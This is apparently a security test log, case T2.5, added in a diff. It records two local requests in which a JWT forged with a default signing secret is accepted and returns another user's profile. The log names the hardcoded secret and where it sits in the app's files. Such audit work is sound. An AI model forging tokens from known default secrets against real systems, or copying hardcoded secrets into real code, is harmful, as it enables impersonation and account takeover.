@@ -1,0 +1,60 @@
+CASO T2.5 - Segredo de assinatura (forjar token com JWT_SECRET default)
+App: A2
+========================================================================
+----- Troca 1 -----
+# token forjado p/ id de B (1)
+>>> GET http://localhost:3000/api/profile
+>>> Authorization: Bearer eyJhbGciOiJI…1kGnkwLI [153 chars]
+
+<<< HTTP 200 OK   (3 ms)
+<<< access-control-allow-origin: *
+<<< connection: keep-alive
+<<< content-length: 195
+<<< content-security-policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
+<<< content-type: application/json; charset=utf-8
+<<< cross-origin-opener-policy: same-origin
+<<< cross-origin-resource-policy: same-origin
+<<< etag: W/"c3-88Cmp9iBCMrLQT72TRooQmjs4hQ"
+<<< keep-alive: timeout=5
+<<< origin-agent-cluster: ?1
+<<< referrer-policy: no-referrer
+<<< strict-transport-security: max-age=15552000; includeSubDomains
+<<< x-content-type-options: nosniff
+<<< x-dns-prefetch-control: off
+<<< x-download-options: noopen
+<<< x-frame-options: SAMEORIGIN
+<<< x-permitted-cross-domain-policies: none
+<<< x-xss-protection: 0
+<<<
+<<< {"user":{"id":3,"name":"Usuario B","email":"usuario.b@teste.local","role":"user","is_active":true,"created_at":"2026-11-07T00:02:25.025Z","updated_at":"2026-11-07T00:02:25.231Z","task_count":20}}
+
+----- Troca 2 -----
+# (2)
+>>> GET http://localhost:3000/api/profile
+>>> Authorization: Bearer eyJhbGciOiJI…1kGnkwLI [153 chars]
+
+<<< HTTP 200 OK   (2 ms)
+<<< access-control-allow-origin: *
+<<< connection: keep-alive
+<<< content-length: 195
+<<< content-security-policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
+<<< content-type: application/json; charset=utf-8
+<<< cross-origin-opener-policy: same-origin
+<<< cross-origin-resource-policy: same-origin
+<<< etag: W/"c3-88Cmp9iBCMrLQT72TRooQmjs4hQ"
+<<< keep-alive: timeout=5
+<<< origin-agent-cluster: ?1
+<<< referrer-policy: no-referrer
+<<< strict-transport-security: max-age=15552000; includeSubDomains
+<<< x-content-type-options: nosniff
+<<< x-dns-prefetch-control: off
+<<< x-download-options: noopen
+<<< x-frame-options: SAMEORIGIN
+<<< x-permitted-cross-domain-policies: none
+<<< x-xss-protection: 0
+<<<
+<<< {"user":{"id":3,"name":"Usuario B","email":"usuario.b@teste.local","role":"user","is_active":true,"created_at":"2026-11-07T00:02:25.025Z","updated_at":"2026-11-07T00:02:25.231Z","task_count":20}}
+
+------------------------------------------------------------------------
+OBSERVAÇÕES:
+JWT_SECRET default 'taskflow-super-secret-jwt-key-2026' está no docker-compose.yml e em middleware/auth.js. Token forjado com esse segredo foi aceito, personificando o usuário B.
